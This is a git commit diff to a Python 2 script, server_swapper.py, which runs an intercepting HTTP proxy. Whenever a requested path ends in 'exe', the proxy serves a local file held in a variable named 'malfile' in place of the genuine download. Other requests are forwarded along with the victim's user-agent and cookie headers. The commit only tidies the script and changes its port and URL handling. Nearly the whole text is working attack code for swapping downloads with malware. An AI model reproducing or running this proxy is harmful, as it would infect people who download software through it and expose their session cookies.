922f598baaa0491a2cb1ee6ccc187e9312f1da24
root <root@localhost.localdomain>
2014-05-21 14:06:59 -0500

    cleaning up

--- server_swapper.py
+++ server_swapper.py
@@ -4,16 +4,11 @@ import urllib, urllib2
 import re
 import os
 
-PORT = 1234
-
-#class cURLopen(urllib.FancyURLopener):
-#	def set_vers(self, vers):
-#		self.version = vers
-
+PORT = 8080
 
 class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
 	error_message_format = ""
-	def send_error(self):
+	def send_error(self, code, message):
 		return False
 	def do_GET(self):
 		if self.path[len(self.path)-3:] == "exe":
@@ -22,20 +17,17 @@ class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
 			self.wfile.write(malfile.read())
 		else:
 			opener = urllib2.build_opener()
-			urlhdr = []
 			urlhdr = [("user-agent", self.headers.get("user-agent")), ("cookie", self.headers.get("cookie"))]
-			#for item in self.headers:
-			#	urlhdr.append((item, self.headers.get(item)))
 			opener.addheaders = urlhdr
-			urlhandle = opener.open(self.path)
+			urlhandle = opener.open("http://" + self.headers.get("host") + self.path)
 			self.wfile.write(urlhandle.read())
-			return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
+		return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
 	def do_POST(self):
 		urlhdr = {}
 		for item in self.headers:
 			urlhdr[item] = self.headers.get(item)
-			urlhandle = urllib.urlopen(self.path)#, urllib.urlencode(urlhdr))
-			self.wfile.write(urlhandle.read())
+		urlhandle = urllib.urlopen(self.path)#, urllib.urlencode(urlhdr))
+		self.wfile.write(urlhandle.read())
 
 
 httpd = SocketServer.ForkingTCPServer(('', PORT), Proxy)
